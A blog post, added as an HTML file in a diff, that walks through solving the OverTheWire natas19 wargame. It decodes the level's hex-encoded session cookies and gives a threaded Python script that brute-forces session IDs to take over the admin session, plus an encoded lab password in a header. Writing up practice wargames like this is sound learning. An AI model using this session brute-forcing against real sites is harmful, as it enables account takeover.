@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" type="text/css" href="/theme/css/style.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/css/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/css/font-awesome.min.css">
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="index, follow" />
+<meta name="author" content="Nikolai Tschacher" />
+<meta name="description" content="Hi everyone I am still trying to solve wargames on overthewire. Level 19 proofed to be very similar to level 18, where server side code looks something like the following: <? $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST["username"] == "admin") { /* This method of authentication appears to ..." />
+<meta name="keywords" content="Python, Wargames, Php, Security">
+<meta property="og:site_name" content="Coding, Learning and IT Security"/>
+<meta property="og:title" content="Solution for wargame natas19"/>
+<meta property="og:description" content="Hi everyone I am still trying to solve wargames on overthewire. Level 19 proofed to be very similar to level 18, where server side code looks something like the following: <? $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST["username"] == "admin") { /* This method of authentication appears to ..."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="/solution-for-wargame-natas19.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2015-09-15 10:59:00+02:00"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="/author/nikolai-tschacher.html">
+<meta property="article:section" content="Php"/>
+<meta property="article:tag" content="Python"/>
+<meta property="article:tag" content="Wargames"/>
+<meta property="article:tag" content="Php"/>
+<meta property="article:tag" content="Security"/>
+<meta property="og:image" content="">  <title>Coding, Learning and IT Security &ndash; Solution for wargame natas19</title>
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="">
+        <img src="/theme/img/profile.png" alt="Coding, Learning and IT Security" title="Coding, Learning and IT Security">
+      </a>
+      <h1><a href="">Coding, Learning and IT Security</a></h1>
+      <p></p>
+      <nav>
+        <ul class="list">
+          <li><a href="/pages/about.html#about">About</a></li>
+          <li><a href="/pages/contact.html#contact">Contact</a></li>
+          <li><a href="/pages/googlescraper-py.html#googlescraper-py">GoogleScraper.py</a></li>
+          <li><a href="/pages/projects.html#projects">Projects</a></li>
+          <li><a href="/pages/impressum.html#impressum">Site Notice</a></li>
+          <li><a href="/pages/svgcaptcha.html#svgcaptcha">SVGCaptcha</a></li>
+        </ul>
+      </nav>
+      <ul class="social">
+        <li><a class="sc-twitter" href="https://twitter.com/incolumitas_" target="_blank"><i class="fa fa-twitter"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/NikolaiT" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-rss" href="//incolumitas/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
+        <li><a class="sc-stack-overflow" href="http://stackoverflow.com/users/1052496/nikolai-tschacher" target="_blank"><i class="fa fa-stack-overflow"></i></a></li>
+      </ul>
+    </div>
+  </aside>
+  <main>
+    <nav>
+      <a href="">Home</a>
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="/tags.html">Tags</a>
+    </nav>
+
+<article>
+  <header>
+    <h1 id="solution-for-wargame-natas19">Solution for wargame natas19</h1>
+    <p>Posted on Di 15 September 2015 in <a href="/category/php.html">Php</a></p>
+  </header>
+  <div>
+    <h2>Hi everyone</h2>
+<p>I am still trying to solve wargames on
+<a href="http://overthewire.org">overthewire</a>. Level 19 proofed to be very
+similar to level 18, where server side code looks something like the
+following:</p>
+<div class="highlight"><pre><span class="cp">&lt;?</span>
+
+<span class="nv">$maxid</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span> <span class="c1">// 640 should be enough for everyone</span>
+
+<span class="k">function</span> <span class="nf">isValidAdminLogin</span><span class="p">()</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="cm">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
+        <span class="c1">//return 1;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">isValidID</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">return</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">createID</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">global</span> <span class="nv">$maxid</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$maxid</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s2">&quot;DEBUG: </span><span class="si">$msg</span><span class="s2">&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">my_session_start</span><span class="p">()</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="k">and</span> <span class="nx">isValidID</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start failed&quot;</span><span class="p">);</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start ok&quot;</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session was old: admin flag set&quot;</span><span class="p">);</span>
+                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// backwards compatible, secure</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cm">/* }}} */</span>
+<span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span> <span class="cm">/* {{{ */</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&quot;</span><span class="p">;</span>
+        <span class="k">print</span> <span class="s2">&quot;Username: natas19n&quot;</span><span class="p">;</span>
+        <span class="k">print</span> <span class="s2">&quot;Password: &quot;</span><span class="p">;</span>  
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+        <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;</span><span class="p">;</span>  
+    <span class="p">}</span>  
+<span class="p">}</span>  
+<span class="cm">/* }}} */</span>
+
+<span class="nv">$showform</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>  
+<span class="k">if</span><span class="p">(</span><span class="nx">my_session_start</span><span class="p">())</span> <span class="p">{</span>  
+    <span class="nx">print_credentials</span><span class="p">();</span>  
+    <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>  
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>  
+            <span class="nb">session_id</span><span class="p">(</span><span class="nx">createID</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]));</span>  
+            <span class="nb">session_start</span><span class="p">();</span>  
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">isValidAdminLogin</span><span class="p">();</span>  
+            <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;New session started&quot;</span><span class="p">);</span>  
+            <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>  
+            <span class="nx">print_credentials</span><span class="p">();</span>  
+    <span class="p">}</span>  
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$showform</span><span class="p">)</span> <span class="p">{</span>  
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">Please login with your admin account to retrieve credentials for</span>
+<span class="x">natas19.</span>
+
+<span class="x">&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span>
+<span class="x">Username: &lt;input name=&quot;username&quot;&gt;</span>
+
+<span class="x">Password: &lt;input name=&quot;password&quot;&gt;</span>
+
+<span class="x">&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/input&gt;</span>
+
+<span class="x">&lt;/form&gt;</span>
+<span class="cp">&lt;?</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>Assuming register_globals are off in the php.ini, we cannot really
+inject some values to alter the logic of the code. Furthermore
+<code>isValidAdminLogin()</code> always returns 0 and never 1, which is our aim.
+But we immediately see that admin cookies are generated in a fixed,
+small range:  </p>
+<p><code>function createID($user) { /* {{{ */     global $maxid; // maxid = 640     return rand(1, $maxid); }</code></p>
+<p>So we can just try brute forcing all cookies from 1 to 640 and we will
+soon be admin.</p>
+<p>Now level19 has a very similar code, but the cookie is generated
+slightly more complex: First I tried some login attempts with different username/password
+combinations:</p>
+<p><code>blabla:blabla -&gt;    PHPSESSID=3235392d 626c61 626c61; path=/; HttpOnly blublu:blublu -&gt;    PHPSESSID=3436382d 626c75 626c75; path=/; HttpOnly admin:AAAAAAAAAAAA -&gt;   PHPSESSID=3538322d 61646d696e; path=/; HttpOnly</code></p>
+<p>We see that the last bytes seem to look like hex values. We can decode
+this with python:</p>
+<p><code>''.join([chr(i) for i in (0x62, 0x6c, 0x61)]) == 'bla' ''.join([chr(i) for i in (0x61, 0x64, 0x6d, 0x69, 0x6e)]) == 'admin'</code></p>
+<p>Assuming the valid ID's are still in the range 1-640, I need to figure
+out where the id is hidden in the cookie. Seems like the username ist
+just appended at the end of the cookie as ascii string. So we need to
+set it to '61646d696e' for admin. The first three bytes are probably the
+ID, because the ascii values are all numbers.</p>
+<p>Overall cookie format:<br />
+<code>NUM NUM NUM HYPHEN/- USERNAME</code></p>
+<p>Examples without ASCII encoding:<br />
+<code>123-admin 001-admin 012-admin 640-admin</code></p>
+<p>The solution to crack the code:</p>
+<div class="highlight"><pre><span class="c">#!/usr/bin/python</span>
+
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">blabla:blabla -&gt;        PHPSESSID=3235392d 626c61 626c61; path=/; HttpOnly</span>
+<span class="sd">blublu:blublu -&gt;        PHPSESSID=3436382d 626c75 626c75; path=/; HttpOnly</span>
+<span class="sd">admin:AAAAAAAAAAAA -&gt;   PHPSESSID=3538322d 61646d696e; path=/; HttpOnly</span>
+
+<span class="sd">We see that the last bytes seem to look like hex values:</span>
+
+<span class="sd">&#39;&#39;.join([chr(i) for i in (0x62, 0x6c, 0x61)]) == &#39;bla&#39;</span>
+<span class="sd">&#39;&#39;.join([chr(i) for i in (0x61, 0x64, 0x6d, 0x69, 0x6e)]) == &#39;admin&#39;</span>
+
+<span class="sd">Assuming the valid ID&#39;s are still in the range 1-640, I need to figure </span>
+<span class="sd">out where the id is hidden in the cookie. Seems like the username ist just </span>
+<span class="sd">appended at the end of the cookie as ascii string. So we need to set it to </span>
+<span class="sd">&#39;61646d696e&#39; for admin. The first three bytes are probably the ID, because</span>
+<span class="sd">the ascii values are all numbers.</span>
+
+<span class="sd">Format:</span>
+
+<span class="sd">NUM NUM NUM HYPHEN/- USERNAME</span>
+
+<span class="sd">Examples without ASCII encoding:</span>
+
+<span class="sd">123-admin</span>
+<span class="sd">001-admin</span>
+<span class="sd">012-admin</span>
+<span class="sd">640-admin</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="k">class</span> <span class="nc">Bruter</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
+
+    <span class="n">username</span> <span class="o">=</span> <span class="s">&#39;admin&#39;</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://natas19.natas.labs.overthewire.org/index.php&#39;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">&#39;Authorization&#39;</span><span class="p">:</span> <span class="s">&#39;Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==&#39;</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">(</span><span class="n">Bruter</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="n">__init__</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sids</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">def</span> <span class="nf">stoa</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">for</span> <span class="nb">id</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">sids</span><span class="p">:</span>
+            <span class="n">session_id</span> <span class="o">=</span> <span class="s">&#39;PHPSESSID=&#39;</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">stoa</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">stoa</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">stoa</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s">&#39;Cookie&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">session_id</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+
+            <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;[i] Requesting with sid {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">session_id</span><span class="p">))</span>
+
+            <span class="k">if</span> <span class="s">&#39;You are logged in as a regular user.&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;[!] Got something: &#39;</span> <span class="o">+</span> <span class="n">session_id</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c"># lets spawn 10 threads</span>
+    <span class="n">threads</span> <span class="o">=</span> <span class="p">[</span><span class="n">Bruter</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)]</span>
+
+    <span class="k">for</span> <span class="n">sid</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">641</span><span class="p">):</span>
+        <span class="n">threads</span><span class="p">[</span><span class="n">sid</span><span class="o">%</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="n">sids</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sid</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="/tag/python.html">Python</a>
+      <a href="/tag/wargames.html">Wargames</a>
+      <a href="/tag/php.html">Php</a>
+      <a href="/tag/security.html">Security</a>
+    </p>
+  </div>
+</article>
+
+    <footer>
+      <p>&copy; Nikolai Tschacher 2015</p>
+<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p>    </footer>
+  </main>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "name": "Solution for wargame natas19",
+  "headline": "Solution for wargame natas19",
+  "datePublished": "2015-09-15 10:59:00+02:00",
+  "dateModified": "",
+  "author": {
+    "@type": "Person",
+    "name": "Nikolai Tschacher",
+    "url": "/author/nikolai-tschacher.html"
+  },
+  "image": "{{ SITEURL }}/{{ THEME_STATIC_DIR }}/img/profile.png",
+  "url": "/solution-for-wargame-natas19.html",
+  "description": "Hi everyone I am still trying to solve wargames on overthewire. Level 19 proofed to be very similar to level 18, where server side code looks something like the following: <? $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST["username"] == "admin") { /* This method of authentication appears to ..."
+}
+</script></body>
+</html>
